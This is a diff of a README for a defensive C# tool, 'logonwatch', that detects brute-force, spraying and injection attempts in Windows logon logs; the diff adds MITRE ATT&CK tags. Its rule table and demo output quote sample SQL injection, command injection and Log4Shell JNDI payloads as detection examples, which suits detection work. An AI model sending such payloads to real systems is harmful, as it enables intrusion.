@@ -37,17 +37,18 @@ But a real log holds thousands of normal entries too: services starting, compute
 - **Remove the noise:** SYSTEM, service logons and computer accounts (`DESKTOP-7$`) log on all day and are dropped before analysis.
 - **Five detection rules:**
 
-  | Rule | Pattern | Severity |
-  |---|---|---|
-  | **success-after-failures** | a logon succeeds after 5+ failures from the same source or for the same account within 10 min: the attack probably worked | Critical |
-  | **brute-force** | 10+ failures from one source within 5 min | Medium, High at 50+, Low if typed at the machine itself |
-  | **password-spray** | one source fails against 5+ different accounts within 10 min, a few tries each to stay under lockout limits | High |
-  | **distributed-attack** | one account fails from 5+ different sources within 10 min, a botnet spreading its guesses | High |
-  | **injection-attempt** | the user name itself is an attack payload: SQL injection (`admin' OR '1'='1`), command injection (`; whoami`), Log4Shell (`${jndi:...}`), script tags, path traversal, format strings or control characters | High, Critical if one was accepted |
+  | Rule | Pattern | Severity | MITRE ATT&CK |
+  |---|---|---|---|
+  | **success-after-failures** | a logon succeeds after 5+ failures from the same source or for the same account within 10 min: the attack probably worked | Critical | T1078 Valid Accounts, T1110 Brute Force, plus T1021.001 RDP if it was a Remote Desktop logon |
+  | **brute-force** | 10+ failures from one source within 5 min | Medium, High at 50+, Low if typed at the machine itself | T1110.001 Password Guessing |
+  | **password-spray** | one source fails against 5+ different accounts within 10 min, a few tries each to stay under lockout limits | High | T1110.003 Password Spraying |
+  | **distributed-attack** | one account fails from 5+ different sources within 10 min, a botnet spreading its guesses | High | T1110.001 Password Guessing |
+  | **injection-attempt** | the user name itself is an attack payload: SQL injection (`admin' OR '1'='1`), command injection (`; whoami`), Log4Shell (`${jndi:...}`), script tags, path traversal, format strings or control characters | High, Critical if one was accepted | T1190 Exploit Public-Facing Application |
 
   The first four rules each use a sliding time window. The injection rule needs no window: no person types `${jndi:ldap://...}` as their name by accident, so a single one is worth an alert.
 
 - **One alert per attack:** overlapping windows merge, so a 2-hour attack is one alert, not thousands.
+- **Tagged with MITRE ATT&CK:** every alert names the techniques it is evidence of, in the text report and as `techniques` (id, name, tactic, link) in JSON. ATT&CK is the shared vocabulary of security teams, so a SIEM or analyst can search for `T1110.003` and find every password spray, whichever tool raised it.
 - **Shareable reports:** `--redact` replaces every account name and address with a placeholder before analysis. Attack payloads are kept, because they are not personal data and hiding them would hide the attack.
 
 ### Why I built it
@@ -59,12 +60,13 @@ SIEM tools such as Splunk and Microsoft Sentinel do this at scale. logonwatch ex
 | Windows Security auditing, events 4624 and 4625, logon types, NTSTATUS codes | `SecurityEventParser.cs` |
 | Attack patterns: brute force, password spraying, distributed attacks, account takeover | `Detection/*Rule.cs` |
 | Sliding-window detection in linear time | `Bursts.cs` |
+| Mapping detections to MITRE ATT&CK techniques and tactics | `Model/Technique.cs`, each rule's `Techniques` |
 | Recognising injection payloads (SQLi, command injection, Log4Shell, XSS) with ReDoS-safe, non-backtracking regexes | `InjectionAttemptRule.cs` |
 | Reading the event log with XPath, admin rights, `.evtx` files | `WindowsEventLogSource.cs` |
 | Trusting only the real event provider (anti-forgery) | `SecurityEventParser.AuditingProvider` |
 | Privacy: redaction, read-only, nothing stored | `Redactor.cs` |
 | Modern C#: records, interfaces, nullable reference types, `init`, pattern matching | throughout |
-| Testing: xUnit, 109 tests including performance on 100,000 events | `tests/` |
+| Testing: xUnit, 119 tests including performance on 100,000 events | `tests/` |
 
 ### Part of a project series
 
@@ -100,7 +102,7 @@ cd logonwatch
 dotnet test
 ```
 
-It ends with `Passed! - Failed: 0, Passed: 109`.
+It ends with `Passed! - Failed: 0, Passed: 119`.
 
 ### 4. Try the demo
 
@@ -178,22 +180,35 @@ logonwatch: 90 logon events from built-in demo scenario (86 failed, 4 successful
   [CRITICAL] success-after-failures
     administrator logged on from 203.0.113.7 after 60 failed attempts in 2 min: treat this account as compromised
     from 2026-10-21 10:01:00 to 2026-10-21 10:03:05 UTC
+    ATT&CK: T1078 Valid Accounts (Initial Access), T1110 Brute Force (Credential Access), T1021.001 Remote Desktop Protocol (Lateral Movement)
 
   [HIGH] brute-force
     60 failed logons from 203.0.113.7 in 2 min against administrator
     from 2026-10-21 10:01:00 to 2026-10-21 10:02:58 UTC
+    ATT&CK: T1110.001 Password Guessing (Credential Access)
 
   [HIGH] password-spray
     198.51.100.23 tried 8 different accounts (8 attempts) in 2 min: admin, backup, sql (+5 more)
     from 2026-10-21 11:00:00 to 2026-10-21 11:02:20 UTC
+    ATT&CK: T1110.003 Password Spraying (Credential Access)
 
   [HIGH] distributed-attack
     backup was attacked from 6 different addresses (12 attempts) in 7 min
     from 2026-10-21 13:00:00 to 2026-10-21 13:07:20 UTC
+    ATT&CK: T1110.001 Password Guessing (Credential Access)
 
   [HIGH] injection-attempt
     192.0.2.66 sent 4 user names that are attack payloads (SQL injection, Log4Shell (JNDI lookup), command injection, script injection): "admin' OR '1'='1", "${jndi:ldap://198.51.100.9/a}", "; whoami" (+1 more)
     from 2026-10-21 14:00:00 to 2026-10-21 14:00:45 UTC
+    ATT&CK: T1190 Exploit Public-Facing Application (Initial Access)
+
+MITRE ATT&CK techniques seen:
+  T1021.001  Remote Desktop Protocol              1 alert   https://attack.mitre.org/techniques/T1021/001/
+  T1078      Valid Accounts                       1 alert   https://attack.mitre.org/techniques/T1078/
+  T1110      Brute Force                          1 alert   https://attack.mitre.org/techniques/T1110/
+  T1110.001  Password Guessing                    2 alerts  https://attack.mitre.org/techniques/T1110/001/
+  T1110.003  Password Spraying                    1 alert   https://attack.mitre.org/techniques/T1110/003/
+  T1190      Exploit Public-Facing Application    1 alert   https://attack.mitre.org/techniques/T1190/
 
 Most failed logons by source:
       60  203.0.113.7
@@ -204,6 +219,8 @@ Most failed logons by source:
 ```
 
 The scenario also contains normal activity that must **not** alert: two successful logons, a user mistyping their password twice at the keyboard, a computer account and a SYSTEM logon. All addresses come from the documentation ranges of RFC 5737, so none is real.
+
+The break-in at 10:03 was a Remote Desktop logon (type 10), which is why that alert also gets T1021.001: the attacker has an interactive session, not just a password.
 
 With `--redact`, the same alert reads `user-5 logged on from ip-2 after 60 failed attempts`.
 
@@ -240,7 +257,7 @@ Both diagrams are drawn in draw.io: [logonwatch-flow.drawio](docs/logonwatch-flo
 
 ## Tests
 
-109 xUnit tests in `tests/LogonWatch.Tests`, run with `dotnet test`. They need no admin rights and no real attack: the parser is tested with the exact XML Windows produces.
+119 xUnit tests in `tests/LogonWatch.Tests`, run with `dotnet test`. They need no admin rights and no real attack: the parser is tested with the exact XML Windows produces.
 
 | File | What it covers |
 |---|---|
@@ -249,6 +266,7 @@ Both diagrams are drawn in draw.io: [logonwatch-flow.drawio](docs/logonwatch-flo
 | `PipelineTests.cs` | the demo, service-account filtering, JSON-lines input and errors, redaction, reports, the command line and exit codes |
 | `InjectionTests.cs` | 15 real attack payloads, 9 real names that must not be flagged, grouping, redaction, safe printing, ReDoS |
 | `EdgeCaseTests.cs` | boundaries and odd data (see below), plus performance on 100,000 events |
+| `AttackTests.cs` | the ATT&CK technique for every rule, RDP added only for Remote Desktop logons, every rule tagged, MITRE link format, text and JSON output |
 
 The main project builds with **warnings as errors and documentation required**: a public member without a doc comment fails the build.
 
@@ -257,6 +275,7 @@ The main project builds with **warnings as errors and documentation required**: 
 ## Roadmap
 
 - [x] Five detection rules, live log, `.evtx` and JSON-lines input, text and JSON reports, redaction
+- [x] Tag every alert with its MITRE ATT&CK techniques
 - [ ] Watch mode: follow the live log and alert as attacks happen
 - [ ] Account lockouts (event 4740) and Kerberos failures (event 4771)
 - [ ] Linux input: convert `/var/log/auth.log` SSH failures into the same detector
